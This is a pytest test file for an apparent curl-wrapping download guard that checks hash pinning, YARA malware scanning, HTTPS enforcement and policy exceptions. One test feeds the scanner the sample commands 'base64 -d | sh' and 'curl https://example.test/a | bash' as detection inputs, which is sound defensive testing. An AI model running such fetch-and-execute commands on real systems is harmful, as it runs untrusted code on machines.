"""Security decisions exercised against real staged local downloads."""

import hashlib
import json
from datetime import datetime, timedelta, timezone

import pytest

from curlguard.config import load_config
from curlguard.edition import EDITION, SECURITY
from curlguard.policy import ArtifactPolicy, normalize_url
from curlguard.scanner import YaraScanner


def policy_file(tmp_path, *, artifacts=None, exceptions=None):
    path = tmp_path / "policy.json"
    path.write_text(
        json.dumps(
            {
                "schema_version": 1,
                "artifacts": artifacts or [],
                "exceptions": exceptions or [],
            }
        )
    )
    return {"CURLGUARD_POLICY_FILE": str(path)}


def record(url, body):
    return {"id": "artifact", "url": url, "sha256": hashlib.sha256(body).hexdigest()}


def test_branch_defaults(monkeypatch, tmp_path):
    for name in list(__import__("os").environ):
        if name.startswith("CURLGUARD_"):
            monkeypatch.delenv(name)
    monkeypatch.setenv("HOME", str(tmp_path))
    config = load_config()
    assert SECURITY == (EDITION == "security-users")
    assert config.edition == EDITION
    assert config.require_sha256 == SECURITY
    assert config.require_https == SECURITY
    assert config.verify_certificates == SECURITY
    assert config.require_fresh_rules == SECURITY
    assert config.unsupported_policy == ("block" if SECURITY else "passthrough")
    assert config.scan_failure_mode == ("block" if SECURITY else "warn")
    assert config.redirect_protocols == (("https",) if SECURITY else ())
    monkeypatch.setenv("CURLGUARD_REQUIRE_SHA256", "false")
    assert not load_config().require_sha256


def test_missing_pin_makes_no_request(http_server, cli):
    url, requests, _ = http_server
    result = cli([url + "/artifact"], overrides={"CURLGUARD_REQUIRE_SHA256": "true"})
    assert result.returncode == 17
    assert not result.stdout and requests == []


@pytest.mark.parametrize("pin,code", [("match", 0), ("0" * 64, 17)])
def test_hash_before_payload_and_etag_commit(http_server, cli, tmp_path, pin, code):
    from tests.conftest import PAYLOAD

    url, _, _ = http_server
    dest, etag = tmp_path / "out", tmp_path / "etag"
    dest.write_bytes(b"existing")
    etag.write_text("old-tag")
    expected = hashlib.sha256(PAYLOAD).hexdigest() if pin == "match" else pin
    result = cli(
        [url + "/artifact", "-o", dest, "--etag-save", etag],
        overrides={"CURLGUARD_EXPECTED_SHA256": expected},
    )
    assert result.returncode == code
    assert not result.stdout
    assert dest.read_bytes() == (PAYLOAD if code == 0 else b"existing")
    if code:
        assert etag.read_text() == "old-tag"
    audit = json.loads((tmp_path / "audit.log").read_text().splitlines()[-1])
    assert audit["evidence"]["integrity"] == ("matched" if code == 0 else "mismatched")
    assert audit["evidence"]["authenticity"] == "unverified"
    assert audit["edition"] == EDITION


def test_conflicting_policy_pin_before_network(http_server, cli, tmp_path):
    url, requests, _ = http_server
    overrides = policy_file(tmp_path, artifacts=[record(url + "/artifact", b"one")])
    overrides["CURLGUARD_EXPECTED_SHA256"] = hashlib.sha256(b"two").hexdigest()
    assert cli([url + "/artifact"], overrides=overrides).returncode == 15
    assert requests == []


def test_conditional_revalidates_retained_file(http_server, cli, tmp_path):
    url, _, _ = http_server
    dest, etag = tmp_path / "out", tmp_path / "etag"
    dest.write_bytes(b"retained bytes")
    etag.write_text('"v1"')
    args = [
        url + "/conditional",
        "-o",
        dest,
        "--etag-compare",
        etag,
        "--etag-save",
        etag,
    ]
    result = cli(
        args,
        overrides={
            "CURLGUARD_EXPECTED_SHA256": hashlib.sha256(b"retained bytes").hexdigest()
        },
    )
    assert result.returncode == 0 and dest.read_bytes() == b"retained bytes"
    old_etag = etag.read_bytes()
    result = cli(args, overrides={"CURLGUARD_EXPECTED_SHA256": "0" * 64})
    assert result.returncode == 17
    assert dest.read_bytes() == b"retained bytes" and etag.read_bytes() == old_etag


def test_conditional_missing_retained_file_blocks(http_server, cli, tmp_path):
    url, _, _ = http_server
    result = cli(
        [url + "/conditional", "--time-cond", "Wed, 01 Jan 2020 00:00:00 GMT"],
        overrides={"CURLGUARD_EXPECTED_SHA256": "0" * 64},
    )
    assert result.returncode == 17 and not result.stdout


def test_hash_does_not_suppress_detection(http_server, cli):
    from tests.conftest import MALWARE

    url, _, _ = http_server
    result = cli(
        [url + "/malware"],
        overrides={"CURLGUARD_EXPECTED_SHA256": hashlib.sha256(MALWARE).hexdigest()},
    )
    assert result.returncode == 11 and not result.stdout


def test_resume_checks_complete_hash(http_server, cli, tmp_path):
    from tests.conftest import PAYLOAD

    url, _, _ = http_server
    dest = tmp_path / "resumed"
    dest.write_bytes(PAYLOAD[:50])
    result = cli(
        [url + "/artifact", "-C", "-", "-o", dest],
        overrides={"CURLGUARD_EXPECTED_SHA256": hashlib.sha256(PAYLOAD).hexdigest()},
    )
    assert result.returncode == 0 and dest.read_bytes() == PAYLOAD


def test_conditional_flagged_retained_file_is_not_allowed(http_server, cli, tmp_path):
    from tests.conftest import MALWARE

    url, _, _ = http_server
    dest, etag = tmp_path / "retained", tmp_path / "etag"
    dest.write_bytes(MALWARE)
    etag.write_text('"v1"')
    result = cli(
        [url + "/conditional", "-o", dest, "--etag-compare", etag, "--etag-save", etag]
    )
    assert result.returncode == 11 and not result.stdout
    assert dest.read_bytes() == MALWARE and etag.read_text() == '"v1"'


def test_explicit_hash_cannot_use_unscanned_passthrough(http_server, cli):
    url, requests, _ = http_server
    result = cli([url, "-d", "body"], overrides={"CURLGUARD_EXPECTED_SHA256": "0" * 64})
    assert result.returncode == 14 and requests == []


def test_required_feed_blocks_before_payload_request(http_server, cli):
    url, requests, _ = http_server
    settings = {
        "CURLGUARD_UPDATE_URL": "https://rules.invalid/bundle.json",
        "CURLGUARD_REQUIRE_FRESH_RULES": "true",
    }
    assert cli([url + "/artifact"], overrides=settings).returncode == 13
    assert requests == []
    settings["CURLGUARD_REQUIRE_FRESH_RULES"] = "false"
    assert cli([url + "/artifact"], overrides=settings).returncode == 0
    assert len(requests) == 1


@pytest.mark.parametrize(
    "change",
    [None, "expired", "wrong_hash", "wrong_source", "wrong_rule", "wrong_origin"],
)
def test_scoped_exception(http_server, cli, tmp_path, change):
    from tests.conftest import MALWARE

    url, _, _ = http_server
    r = record(url + "/malware", MALWARE)
    r.update(
        rules=["base64_encoded_shell"],
        expires_at=(datetime.now(timezone.utc) + timedelta(days=1)).isoformat(),
        reason="reviewed inert fixture",
    )
    if change == "expired":
        r["expires_at"] = "2020-01-01T00:00:00Z"
    elif change == "wrong_hash":
        r["sha256"] = "0" * 64
    elif change == "wrong_source":
        r["url"] += "?other"
    elif change == "wrong_rule":
        r["rules"] = ["other"]
    elif change == "wrong_origin":
        r["allowed_final_origins"] = ["https://other.example"]
    result = cli([url + "/malware"], overrides=policy_file(tmp_path, exceptions=[r]))
    assert result.returncode == (0 if change is None else 11)
    assert bool(result.stdout) == (change is None)


def test_additional_findings_not_suppressed():
    from pathlib import Path

    from curlguard.config import CurlGuardConfig
    from curlguard.policy import evaluate_findings

    config = CurlGuardConfig("per-user", Path("unused"))
    result = YaraScanner().scan(b"base64 -d | sh\ncurl https://example.test/a | bash")
    assert (
        evaluate_findings(result, config, {"base64_encoded_shell"}).action
        == "quarantine"
    )


def test_final_origin_policy(http_server, cli, tmp_path):
    url, _, _ = http_server
    r = record(url + "/redirect", b"unused")
    r["allowed_final_origins"] = ["https://other.example"]
    result = cli(
        [url + "/redirect", "-L"], overrides=policy_file(tmp_path, artifacts=[r])
    )
    assert result.returncode == 12 and not result.stdout


def test_explicit_fetch_and_unknown_options(http_server, cli):
    from tests.conftest import PAYLOAD

    url, _, _ = http_server
    result = cli(
        ["fetch", url + "/redirect", "--sha256", hashlib.sha256(PAYLOAD).hexdigest()],
        management=True,
    )
    assert result.returncode == 0 and result.stdout == PAYLOAD
    assert cli(["fetch", url, "--unknown"], management=True).returncode == 2
    assert cli(["fetch", "ftp://example.test/file"], management=True).returncode == 2
    assert cli(["fetch", url, "-o", ""], management=True).returncode == 2


def test_fetch_never_falls_back_to_unscanned_output(http_server, cli, tmp_path):
    url, requests, _ = http_server
    symlink = tmp_path / "symlink"
    symlink.symlink_to(tmp_path / "missing")
    result = cli(["fetch", url, "-o", symlink], management=True)
    assert result.returncode == 14 and requests == []


def test_configured_artifact_pins_prevent_unscanned_bypass(http_server, cli, tmp_path):
    url, requests, _ = http_server
    overrides = policy_file(tmp_path, artifacts=[record(url, b"inert")])
    result = cli(["-N", url], overrides=overrides)
    assert result.returncode == 14 and requests == []


def test_https_preflight(http_server, cli):
    url, requests, _ = http_server
    result = cli([url], overrides={"CURLGUARD_REQUIRE_HTTPS": "true"})
    assert result.returncode == 12 and requests == []


def test_general_mode_reports_observed_redirect_downgrade(
    https_server, http_server, cli, tmp_path
):
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    https, cert = https_server
    _, _, server = http_server

    class Destination(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Length", "5")
            self.end_headers()
            self.wfile.write(b"inert")

    destination = ThreadingHTTPServer(("127.0.0.1", 0), Destination)
    thread = threading.Thread(target=destination.serve_forever, daemon=True)
    thread.start()

    def redirect(self):
        self.send_response(302)
        self.send_header(
            "Location", f"http://127.0.0.1:{destination.server_port}/artifact"
        )
        self.send_header("Content-Length", "0")
        self.end_headers()

    server.RequestHandlerClass.do_GET = redirect
    try:
        result = cli([https, "-L", "--cacert", cert])
        assert result.returncode == 0 and result.stdout == b"inert"
        assert b"insecure transport" in result.stderr
        event = json.loads((tmp_path / "audit.log").read_text().splitlines()[-1])
        assert "redirect_downgrade" in event["evidence"]["transport"]["findings"]
    finally:
        destination.shutdown()
        destination.server_close()
        thread.join()


def test_https_redirect_cannot_reach_http(https_server, http_server, cli):
    https, cert = https_server
    _, requests, server = http_server
    original = server.RequestHandlerClass.do_GET

    def redirect(self):
        if self.path == "/downgrade":
            self.send_response(302)
            self.send_header("Location", "http://127.0.0.1:9/forbidden")
            self.send_header("Content-Length", "0")
            self.end_headers()
        else:
            original(self)

    server.RequestHandlerClass.do_GET = redirect
    result = cli(
        [https + "/downgrade", "-L", "--cacert", cert],
        overrides={"CURLGUARD_REDIRECT_PROTOCOLS": "https"},
    )
    assert result.returncode == 1 and not result.stdout
    assert requests == []


def test_insecure_and_tls_conflicts_before_network(https_server, cli):
    url, _ = https_server
    assert (
        cli([url, "-k"], overrides={"CURLGUARD_VERIFY_CERTIFICATES": "true"}).returncode
        == 12
    )
    assert (
        cli(
            [url, "--tls-max", "1.1"], overrides={"CURLGUARD_MIN_TLS": "1.2"}
        ).returncode
        == 12
    )


def test_policy_url_normalization_and_validation(tmp_path):
    assert normalize_url("https://EXAMPLE.com:443/a?q=x") == "https://example.com/a?q=x"
    r = record("https://example.com/a#fragment", b"x")
    env = policy_file(tmp_path, artifacts=[r])
    from pathlib import Path

    with pytest.raises(ValueError):
        ArtifactPolicy.load(Path(env["CURLGUARD_POLICY_FILE"]))


def test_legacy_trust_and_conflicting_transport_config(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("CURLGUARD_TRUSTED_HOSTS", "example.com")
    with pytest.raises(ValueError, match="legacy trust"):
        load_config()
    monkeypatch.delenv("CURLGUARD_TRUSTED_HOSTS")
    monkeypatch.setenv("CURLGUARD_SSL_WARN_ONLY", "false")
    monkeypatch.setenv("CURLGUARD_REQUIRE_HTTPS", "true")
    with pytest.raises(ValueError, match="conflicts"):
        load_config()
